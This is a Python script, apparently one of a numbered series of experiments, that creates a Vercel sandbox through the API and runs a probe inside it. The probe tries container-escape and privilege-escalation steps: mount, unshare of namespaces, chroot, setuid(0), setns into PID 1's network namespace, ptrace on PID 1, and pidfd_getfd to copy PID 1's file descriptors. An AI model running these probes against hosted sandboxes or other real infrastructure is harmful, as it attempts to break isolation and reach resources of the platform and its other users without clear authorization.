# -*- coding: utf-8 -*-
"""实验J280g: 权限探针 + pidfd_getfd (单独)"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

NAME = "expj280g"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

def run_cmd_raw(sid, code, label):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": 100}
    t0 = time.time()
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    print(r[:5000], flush=True)

CODE = r'''
import os, subprocess
def sh(cmd, t=6):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace")
    except Exception as e:
        return "ERR %s" % e
print("mount:", sh("mkdir -p /tmp/m1 && mount -t tmpfs tmpfs /tmp/m1 2>&1"), flush=True)
print("unshare-m:", sh("unshare -m true 2>&1"), flush=True)
print("unshare-p:", sh("unshare -p -f true 2>&1"), flush=True)
print("unshare-u:", sh("unshare -U true 2>&1"), flush=True)
print("chroot:", sh("mkdir -p /tmp/c1 && chroot /tmp/c1 /bin/true 2>&1"), flush=True)
print("setuid0:", sh("python3 -c \"import os; os.setuid(0); print('ROOT_OK uid=', os.getuid())\" 2>&1"), flush=True)
print("setns-net:", sh("python3 -c \"import ctypes; libc=ctypes.CDLL(None); fd=os.open('/proc/1/ns/net', os.O_RDONLY); print('SETNS', libc.setns(fd, 0))\" 2>&1"), flush=True)
print("ptrace1:", sh("python3 -c \"import ctypes; libc=ctypes.CDLL(None); print('PTRACE_ATTACH', libc.ptrace(16, 1, 0, 0))\" 2>&1"), flush=True)
print("===== pidfd_getfd =====", flush=True)
try:
    pidfd = os.pidfd_open(1, 0)
    copied = []
    for i in range(0, 20):
        try:
            nfd = os.pidfd_getfd(pidfd, i, 0)
            copied.append((i, nfd))
        except Exception:
            pass
    print("COPIED:", copied, flush=True)
    for i, nfd in copied:
        try:
            print(i, "->", os.readlink("/proc/self/fd/%d" % nfd), flush=True)
        except Exception:
            pass
    os.close(pidfd)
except Exception as e:
    print("PIDFD_ERR %s: %s" % (type(e).__name__, e), flush=True)
print("DONE", flush=True)
'''
run_cmd_raw(sid, CODE, "PROBE")
